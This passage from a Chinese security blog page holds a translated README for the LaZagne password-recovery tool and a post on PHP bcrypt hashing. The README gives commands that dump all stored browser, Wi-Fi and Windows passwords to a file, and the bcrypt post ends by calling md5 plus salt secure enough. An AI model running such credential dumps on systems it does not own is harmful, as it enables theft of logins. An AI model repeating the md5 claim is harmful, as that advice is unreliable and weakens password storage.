<p><pre class="brush: actionscript3; gutter: true">cmd: laZagne.exe<br>example: laZagne.exe browsers -f<br>help: laZagne.exe browsers -h</pre><br>将所有的密码写入文件（-w选项）</p>
<p><pre class="brush: actionscript3; gutter: true">cmd: laZagne.exe all -w</pre><br><strong>注意：WI-FI密码/Windows密码需要启动管理员权限（UAC验证/sudo）</strong></p>
<p><strong>支持软件</strong></p>
<p><a href="http://image.3001.net/images/20150524/14324360298957.png!small" target="_blank" rel="external"><img src="http://image.3001.net/images/20150524/14324360298957.png!small" alt="" title="softwares.png"></a></p>
<p>(*) 有些软件可能存在使用插件等方式保存密码：Chrome, Owncloud, Evolution, KMail</p>
<p><strong>IE浏览器历史记录</strong></p>
<p>IE浏览器密码（从IE7到早前的Windows8）只能使用网站URL进行解密，只是作为Win32CryptUnprotectData api的一个参数。因此，使用IE浏览器历史记录能够将密码破解出来。要做到这一点，我需要使用一个C语言编写的DLL（代码在browser_history_dll目录下）且作为一个Base64字符串直接嵌入python代码中。加载之后，DLL会写入磁盘，其中一个包装类是用来调用DLL函数的然后这个DLL文件会从磁盘删除。</p>
<p><strong>构建属于你自己的密码恢复脚本</strong></p>
<p>你可以自由的为你选择的软件编写一个脚本。并且不用担心，编写一个模块十分简单。<strong>
</strong></p>
<p>要做到这一点，我们需要满足一些代码标准。</p>
<p>1.使用软件名创建一个类包含两个重要的函数：</p>
<p><pre class="brush: actionscript3; gutter: true">init:用于定义启动类的所有参数<br>run:主函数</pre><br>2.将类名和相关信息添加到config.manageModules.py文件</p>
<p>3.所有包含密码的输出都必须发送到”print_output”函数</p>
<p><pre class="brush: actionscript3; gutter: true">举例：print_output(software_name, password_list)</pre><br>4.可选项：你可以使用”print_debug” 函数打印出输出结果</p>
<p>5.也可以参考现有脚本，用以理解。</p>
<p>要求</p>
<p>为了编译源代码，需要一些外部库</p>
<p>Windows：</p>
<p><pre class="brush: actionscript3; gutter: true">colorama(<a href="https://pypi.python.org/pypi/colorama" target="_blank" rel="external">https://pypi.python.org/pypi/colorama</a>) Python Windows扩展(<a href="http://sourceforge.net/projects/pywin32/）" target="_blank" rel="external">http://sourceforge.net/projects/pywin32/）</a> pycrypto（pip安装pycrypto） Impacket（<a href="https://github.com/CoreSecurity/impacket）" target="_blank" rel="external">https://github.com/CoreSecurity/impacket）</a></pre><br>Linux：</p>
<p>对于Ubuntu 14.04</p>
<p><pre class="brush: actionscript3; gutter: true">python-kde4 (Kwallet)</pre><br>其他发行版</p>
<p><pre class="brush: actionscript3; gutter: true ">Python 2.7<br>argparse<br>Crypto<br>dbus (Pidgin)<br>python-kde4 (Kwallet)</pre><br>项目地址：<a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="external">https://github.com/AlessandroZ/LaZagne</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/05/28/e5-bf-98-e8-ae-b0-e5-af-86-e7-a0-81-e5-92-8b-e5-8a-9e-ef-bc-9f-e6-9c-ac-e5-9c-b0-e5-af-86-e7-a0-81-e6-a3-80-e7-b4-a2-e5-b7-a5-e5-85-b7-lazagne-project/" data-id="cimy8bfbp000974gc3h5k6mur" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-php5-5-e4-bd-bf-e7-94-a8bcrypt-e5-8a-a0-e5-af-86-e5-af-86-e7-a0-81" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/05/21/php5-5-e4-bd-bf-e7-94-a8bcrypt-e5-8a-a0-e5-af-86-e5-af-86-e7-a0-81/" class="article-date">
  <time datetime="2015-05-21T06:58:55.000Z" itemprop="datePublished">2015-05-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/PHP/">PHP</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/05/21/php5-5-e4-bd-bf-e7-94-a8bcrypt-e5-8a-a0-e5-af-86-e5-af-86-e7-a0-81/">PHP5.5使用Bcrypt加密密码</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>在php5.5中，加入了一个新的密码哈希函数，可使用Bcrypt轻松实现加盐的安全密码。</p>
<p>bcrypt和其他对称或非对称加密方式不同的是，不是直接解密得到明文，也不是二次加密比较密文，而是把明文和存储的密文一块运算得到另一个密文，如果这两个密文相同则验证成功。</p>
<p>官方手册在这里： <a href="http://cn2.php.net/manual/zh/book.password.php" target="_blank" rel="external">http://cn2.php.net/manual/zh/book.password.php</a></p>
<p>生成密钥</p>
<p>[php]<br>$hash = password_hash(‘password’,PASSWORD_BCRYPT,[‘cost’ =&gt; 10]);<br>echo $hash;<br>[/php]</p>
<p>password_hash() —-加密密码<br>第一个参数：需要加密的密码<br>第二个参数：密码算法常量 (<a href="http://cn2.php.net/manual/zh/password.constants.php" target="_blank" rel="external">http://cn2.php.net/manual/zh/password.constants.php</a>)<br>第三个参数：数组类型。支持两个选项：salt在散列密码时加的盐（干扰字符串）。cost用来指明算法递归的层数。</p>
<p>上面代码每次运行生成的密钥不同，大致效果如下。</p>
<p>[php]<br>$2y$10$bWNfw6QbjmjyCDBc9lrZRuBjraxBzN7eAuozS6D3r4QxJn0tgXRwe<br>[/php]</p>
<p>生成的密钥长度为60位，所以设计数据库的时候需要注意。</p>
<p>验证密钥</p>
<p>懒得存数据库再去取了，直接把刚生成的密钥复制过来了~~</p>
<p>[php]<br>$hash = ‘$2y$10$bWNfw6QbjmjyCDBc9lrZRuBjraxBzN7eAuozS6D3r4QxJn0tgXRwe’;<br>$res = password_verify(‘password’,$hash);<br>var_dump($res);<br>[/php]</p>
<p>如果没有天灾人祸意外发生的话。你会看到下面的输出</p>
<p>[php]bool(true)[/php]</p>
<p>这就成功了。</p>
<p>性能</p>
<p>下面我们来看看Bcrypt的性能，安全性的提升，肯定是以性能为代价。bcrypt要加强密码安全性，增加运行时间也是肯定的。那我们现在就测试一下Bcrypt与普通md5的速度。</p>
<p>测试机性能：</p>
<p>CPU I7 4核 2.3G主频<br>内存 16G ddr3 内存<br>系统 Mac<br>PHP 5.5.15</p>
<p>现在用下面这段代码分别测试一下md5和Bcrypt在不加盐的情况下的运行速度<br>[php]<br>&lt;!–?php<br> $s_time = microtime(true);</p>
<p>password_hash(‘password’,PASSWORD_BCRYPT,[‘cost’ =&gt; 10]);<br>// md5(‘password’);<br>$e_time = microtime(true);<br>$run_time = $e_time-$s_time;</p>
<p>echo ($run_time*1000).’ms’;<br>[/php]<br>Bcrypt 5次运行结果<br>[php]<br>68.569183349609ms<br>68.006992340088ms<br>69.074869155884ms<br>68.211078643799ms<br>68.757057189941ms<br>[/php]<br>md5 5次运行结果<br>[php]<br>0.0040531158447266ms<br>0.0040531158447266ms<br>0.0050067901611328ms<br>0.0040531158447266ms<br>0.003814697265625ms<br>[/php]<br>测试结果</p>
<p>Bcrypt 加密一个密文平均值在68毫秒左右，<br>md5 加密一个密文平均值在0.004毫秒左右，</p>
<p>性能大约差距16000倍</p>
<p>采用md5 一秒大约能加密 250000个密文<br>采用Bcrypt 一秒大约能加密 14个密文</p>
<p>所以，如果你要将Bcrypt用到你的程序中去的话。小应用还好，如果是大应用。您就得按倍数增加服务器了。<br>如果不是给五角大楼写程序，其实md5+salt安全性已经足够了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/05/21/php5-5-e4-bd-bf-e7-94-a8bcrypt-e5-8a-a0-e5-af-86-e5-af-86-e7-a0-81/" data-id="cimy8bfc4000l74gcvx7zugjd" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">__('next') &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/PHP/">PHP</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网/">内网</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/注入/">注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞利用/">漏洞利用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞挖掘/">漏洞挖掘</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/工具/">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/注入，注入技巧/">注入，注入技巧</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/python/" style="font-size: 20px;">python</a> <a href="/tags/工具/" style="font-size: 10px;">工具</a> <a href="/tags/注入，注入技巧/" style="font-size: 10px;">注入，注入技巧</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">July 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">June 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">April 2015</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2016/03/11/e6-b5-85-e8-b0-88-e4-bc-81-e4-b8-9a-e7-bd-91-e7-bb-9c-e8-be-b9-e7-95-8c-3/">浅谈企业网络边界</a>
          </li>
        
          <li>
            <a href="/2016/03/02/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e4-b9-8bsocks5-e4-bb-a3-e7-90-86-ef-bc-88regeorgproxifier-e8-af-a6-e7-bb-86-e9-85-8d-e7-bd-ae-e8-af-b4-e6-98-8e-ef-bc-89/">内网渗透之socks5代理（reGeorg+proxifier详细配置说明）</a>
          </li>
        
          <li>
            <a href="/2015/11/10/e5-82-bb-e7-93-9c-e5-bc-8f-e9-80-9a-e7-94-a8-e9-92-93-e9-b1-bc-e5-b7-a5-e5-85-b7weeman1-5-greentree/">傻瓜式通用钓鱼工具Weeman1.5-GreenTree</a>
          </li>
        
          <li>
            <a href="/2015/09/29/e5-85-b3-e4-ba-8e-e6-9c-8d-e5-8a-a1-e5-99-a8-e7-9a-84host-e7-bb-91-e5-ae-9a-e7-9a-84-e4-b8-8d-e5-ae-89-e5-85-a8-e5-9b-a0-e7-b4-a0/">关于服务器的host绑定的不安全因素</a>
          </li>
        
          <li>
            <a href="/2015/07/15/mysql-e5-b8-83-e5-b0-94-e7-9b-b2-e6-b3-a8/">Mysql布尔盲注脚本</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2016 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>